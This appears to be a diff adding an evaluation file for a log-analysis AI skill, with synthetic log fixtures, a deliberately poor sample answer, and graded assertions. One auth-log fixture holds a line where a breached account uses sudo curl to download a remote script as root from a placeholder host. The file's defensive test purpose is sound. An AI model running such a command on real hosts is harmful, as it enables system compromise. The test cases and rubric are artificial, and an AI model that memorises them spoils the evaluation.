@@ -1,0 +1,186 @@
+# Fabric AnalyzeLogs — a diagnosis of a log, every finding quoted from it.
+# The code asserts pin the literal shape (Verdict first, the three sections in
+# order, quoted Evidence, masked secrets, no invented findings on a no-log
+# question); the judged asserts carry what code cannot: ranking by impact,
+# root cause, specificity, and the read of each kind of input.
+# Synthetic inline fixtures only: documentation IP ranges, example hosts.
+name: fabric-analyzelogs
+type: capability
+pass_threshold: 0.75
+trials: 3
+# The intent's evidence-calibration rules make the longest case (the 502 chain)
+# run past the 90 s default answer timeout.
+subject_timeout_ms: 180000
+system_prompt_file: "~/.claude/skills/Fabric/Intents/AnalyzeLogs.md"
+cases:
+  - id: recurring_502_root_cause
+    prompt: &p_502 |
+      analyze these logs
+
+      2026-03-02T02:58:00Z web-1 nginx: 192.0.2.4 "GET /healthz HTTP/1.1" 200 2
+      2026-03-02T02:58:30Z web-1 nginx: 192.0.2.4 "GET /healthz HTTP/1.1" 200 2
+      2026-03-02T02:59:00Z app-1 WARN DeprecationWarning: Buffer() is deprecated, use Buffer.from()
+      2026-03-02T02:59:00Z app-1 INFO heap_used_mb=1480 heap_limit_mb=2048 rss_mb=1710
+      2026-03-02T02:59:30Z web-1 nginx: 192.0.2.4 "GET /healthz HTTP/1.1" 200 2
+      2026-03-02T03:00:00Z app-1 WARN DeprecationWarning: Buffer() is deprecated, use Buffer.from()
+      2026-03-02T03:00:00Z app-1 INFO heap_used_mb=1795 heap_limit_mb=2048 rss_mb=2010
+      2026-03-02T03:00:41Z web-1 nginx: [error] upstream prematurely closed connection while reading response header from upstream, client: 198.51.100.23, request: "POST /api/orders HTTP/1.1", upstream: "http://192.0.2.9:3000/api/orders"
+      2026-03-02T03:00:41Z web-1 nginx: 198.51.100.23 "POST /api/orders HTTP/1.1" 502 157
+      2026-03-02T03:00:42Z app-1 FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory
+      2026-03-02T03:00:43Z kernel: Out of memory: Killed process 4121 (node) total-vm:3120044kB
+      2026-03-02T03:00:44Z systemd[1]: orders-api.service: Main process exited, code=killed, status=9/KILL
+      2026-03-02T03:00:49Z systemd[1]: orders-api.service: Scheduled restart job, restart counter is at 3.
+      2026-03-02T03:00:50Z web-1 nginx: [error] connect() failed (111: Connection refused) while connecting to upstream, client: 198.51.100.40, request: "GET /api/orders/88 HTTP/1.1"
+      2026-03-02T03:00:50Z web-1 nginx: 198.51.100.40 "GET /api/orders/88 HTTP/1.1" 502 157
+      2026-03-02T03:01:00Z app-1 WARN DeprecationWarning: Buffer() is deprecated, use Buffer.from()
+      2026-03-02T03:01:00Z app-1 INFO orders-api listening on :3000
+      2026-03-02T03:01:00Z app-1 INFO heap_used_mb=210 heap_limit_mb=2048 rss_mb=300
+      2026-03-02T03:01:30Z web-1 nginx: 192.0.2.4 "GET /healthz HTTP/1.1" 200 2
+    # SYNTHETIC ADVERSARIAL FIXTURE: right shape, real quotes, but it ranks the
+    # deprecation noise first, never connects heap growth to the OOM kill and
+    # the 502s, and its recommendations would fit any system.
+    adversarial_output: |
+      **Verdict:** The log shows several warnings and some errors; overall the service needs attention.
+
+      ## Findings
+
+      ### 1. Deprecated Buffer API in use
+
+      - Seen: 3× from 02:59:00 to 03:01:00
+      - Evidence: `WARN DeprecationWarning: Buffer() is deprecated, use Buffer.from()`
+      - Impact: Could cause problems in future Node versions.
+
+      ### 2. Frequent health checks
+
+      - Seen: 4× from 02:58:00 to 03:01:30
+      - Evidence: `"GET /healthz HTTP/1.1" 200 2`
+      - Impact: Adds load to the server.
+
+      ### 3. Some 502 errors
+
+      - Seen: 2× from 03:00:41 to 03:00:50
+      - Evidence: `"POST /api/orders HTTP/1.1" 502 157`
+      - Impact: Some users saw errors.
+
+      ## Reliability and performance
+
+      The service is mostly up, with occasional errors and an OOM event.
+
+      ## Recommendations
+
+      1. Update deprecated APIs (finding 1)
+      2. Consider reducing health check frequency (finding 2)
+      3. Improve monitoring and consider scaling (finding 3)
+    assert:
+      - type: regex
+        weight: 2
+        value: '^\s*\*\*Verdict:\*\*\s+\S'
+      - type: regex
+        weight: 2
+        value: '## Findings[\s\S]*## Reliability and performance[\s\S]*## Recommendations'
+      - type: regex
+        weight: 1
+        value: 'Evidence:\s*`[^`]+`'
+      - type: contains-any
+        weight: 1
+        value: [ "OOM", "out of memory", "Out of memory", "heap" ]
+      - type: not-icontains
+        value: "virtual minutes"
+        weight: 1
+      - type: llm-assert
+        weight: 4
+        value: [ "The top finding (finding 1) is the out-of-memory crash of the orders API, not the deprecation warning or the health checks", "The output connects the growing heap figures, the out-of-memory kill and restart, and the 502 responses as one chain of cause and effect", "The health-check lines are not reported as a problem", "Every recommendation is a specific change for this system (for example finding the leak with a heap snapshot, or a memory limit or heap setting with a value), not generic advice such as improve monitoring or consider scaling", "Counts and timestamps match the log (for example 2 responses with status 502, restart counter at 3)" ]
+        reference: *p_502
+
+  - id: deploy_question_answered_first
+    prompt: &p_deploy |
+      why did the deploy fail?
+
+      [12:01:02] Run npm ci
+      [12:01:19] npm WARN deprecated inflight@1.0.6: This module is not supported, and leaks memory.
+      [12:01:19] npm WARN deprecated glob@7.2.3: Glob versions prior to v9 are no longer supported
+      [12:01:31] added 812 packages in 29s
+      [12:01:32] Run npm run build
+      [12:02:10] Build completed in 38.1s
+      [12:02:11] Run npm run migrate
+      [12:02:12] > example-shop@4.2.0 migrate
+      [12:02:12] > node scripts/migrate.js
+      [12:02:13] Error: DATABASE_URL is not set
+      [12:02:13]     at loadConfig (scripts/migrate.js:14:11)
+      [12:02:13]     at Object.<anonymous> (scripts/migrate.js:40:1)
+      [12:02:13] Error: Process completed with exit code 1.
+      [12:02:14] Skipping step "Deploy to production": a previous step failed
+    assert:
+      - type: regex
+        weight: 2
+        value: '^\s*\*\*Verdict:\*\*\s+\S'
+      - type: regex
+        weight: 1
+        value: '\*\*Verdict:\*\*[^\n]*DATABASE_URL'
+      - type: llm-assert
+        weight: 4
+        value: [ "The Verdict answers why the deploy failed: the migrate step exited because DATABASE_URL was not set, so the deploy step was skipped", "The npm deprecation warnings are not presented as the cause of the failure", "The first recommendation is a concrete fix such as setting DATABASE_URL as a secret or environment variable for the migrate step in the pipeline" ]
+        reference: *p_deploy
+
+  - id: bruteforce_then_success_masked
+    prompt: &p_auth |
+      analyze_logs on this auth.log, is this an attack?
+
+      Mar  2 04:10:01 bastion sshd[2201]: Failed password for root from 203.0.113.45 port 50112 ssh2
+      Mar  2 04:10:03 bastion sshd[2203]: Failed password for root from 203.0.113.45 port 50118 ssh2
+      Mar  2 04:10:05 bastion sshd[2205]: Failed password for invalid user admin from 203.0.113.45 port 50124 ssh2
+      Mar  2 04:10:07 bastion sshd[2207]: Failed password for invalid user test from 203.0.113.45 port 50130 ssh2
+      Mar  2 04:10:09 bastion sshd[2209]: Failed password for deploy from 203.0.113.45 port 50136 ssh2
+      Mar  2 04:10:11 bastion sshd[2211]: Failed password for deploy from 203.0.113.45 port 50142 ssh2
+      Mar  2 04:10:13 bastion sshd[2213]: Accepted password for deploy from 203.0.113.45 port 50148 ssh2
+      Mar  2 04:10:13 bastion sshd[2213]: pam_unix(sshd:session): session opened for user deploy(uid=1001)
+      Mar  2 04:10:40 bastion sudo: deploy : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=/usr/bin/curl -s https://files.example.net/x.sh?token=EXAMPLEtok3n9f8e7d6c
+      Mar  2 04:20:00 bastion CRON[2300]: (root) CMD (/usr/local/bin/backup.sh)
+    assert:
+      - type: regex
+        weight: 2
+        value: '^\s*\*\*Verdict:\*\*\s+\S'
+      - type: contains
+        weight: 1
+        value: "203.0.113.45"
+      - type: not-contains
+        weight: 2
+        value: "EXAMPLEtok3n9f8e7d6c"
+      - type: llm-assert
+        weight: 4
+        value: [ "The Verdict says yes, this looks like a successful attack: repeated failed passwords from 203.0.113.45 followed by an accepted password for deploy from the same address", "The sudo curl of a remote script as root right after the login is flagged as likely post-compromise activity", "The routine cron backup line is not reported as a problem", "Recommendations are specific incident steps for this host (for example disabling password authentication, locking or rotating the deploy account, blocking the source address, examining what the downloaded script did)" ]
+        reference: *p_auth
+
+  - id: no_log_bare_question
+    prompt: "analyze logs: what does 'too many open files' mean in my nginx error log?"
+    assert:
+      - type: not-regex
+        weight: 2
+        value: '###\s+1\.'
+      - type: not-icontains
+        weight: 1
+        value: "Seen:"
+      - type: llm-assert
+        weight: 4
+        value: [ "It explains that the process hit its open file descriptor limit (EMFILE)", "It names the likely causes, such as a low worker_rlimit_nofile or ulimit, too many connections for worker_connections, or a descriptor leak", "It gives exact commands or settings that tell those causes apart or fix them (for example ulimit -n, worker_rlimit_nofile, lsof or /proc/<pid>/limits)", "It invents no findings, timestamps or counts from a log that was never supplied, and it does not ask the user to clarify before answering" ]
+        reference: "analyze logs: what does 'too many open files' mean in my nginx error log?"
+
+  - id: healthy_log_gets_none
+    prompt: &p_ok |
+      check this log for problems
+
+      2026-03-02T09:00:00Z api-2 INFO GET /v1/items 200 18ms
+      2026-03-02T09:00:01Z api-2 INFO GET /v1/items/41 200 9ms
+      2026-03-02T09:00:01Z api-2 INFO POST /v1/cart 201 31ms
+      2026-03-02T09:00:02Z api-2 INFO GET /healthz 200 1ms
+      2026-03-02T09:00:03Z api-2 INFO GET /v1/items 200 21ms
+      2026-03-02T09:00:04Z api-2 INFO GET /favicon.ico 404 1ms
+      2026-03-02T09:00:05Z api-2 INFO GET /v1/items/7 200 11ms
+    assert:
+      - type: regex
+        weight: 2
+        value: '## Findings\s*\n\s*None\b'
+      - type: llm-assert
+        weight: 3
+        value: [ "The Verdict says the system looks healthy", "The favicon 404 and the health check are not reported as problems", "Any latency or rate figures given match the log" ]
+        reference: *p_ok
